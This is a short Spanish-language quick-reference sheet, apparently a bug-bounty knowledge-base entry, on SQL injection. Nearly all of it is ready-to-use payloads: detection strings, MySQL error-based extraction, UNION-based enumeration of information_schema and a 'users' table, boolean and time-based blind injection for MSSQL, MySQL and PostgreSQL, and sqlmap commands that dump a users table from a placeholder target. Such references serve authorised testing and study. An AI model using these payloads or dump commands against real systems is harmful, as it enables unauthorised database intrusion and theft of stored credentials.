---
id: seed_1777131256338_j2x4l8
title: SQL Injection — Referencia Rápida
type: technique
tags: ["sqli", "sql-injection", "bug-bounty", "ofensivo"]
created: 2026-04-25T15:34:16.338Z
updated: 2026-04-25T15:34:16.338Z
---

## Detección Básica
```
'
''
' OR '1'='1
' OR 1=1--
" OR 1=1--
```

## Error-Based (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,database()),1)--
```

## UNION-Based
```sql
' ORDER BY 3--              -- encontrar número de columnas
' UNION SELECT 1,2,3--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
```

## Blind SQLi (Boolean)
```sql
' AND 1=1--              -- TRUE
' AND 1=2--              -- FALSE
' AND SUBSTRING(password,1,1)='a'--
```

## Blind SQLi (Time-Based)
```sql
'; IF(1=1) WAITFOR DELAY '0:0:5'--      -- MSSQL
' AND SLEEP(5)--                          -- MySQL
' AND pg_sleep(5)--                       -- PostgreSQL
```

## sqlmap
```bash
sqlmap -u "https://target.com/item?id=1" --dbs
sqlmap -u "https://target.com/item?id=1" -D dbname --tables
sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump
```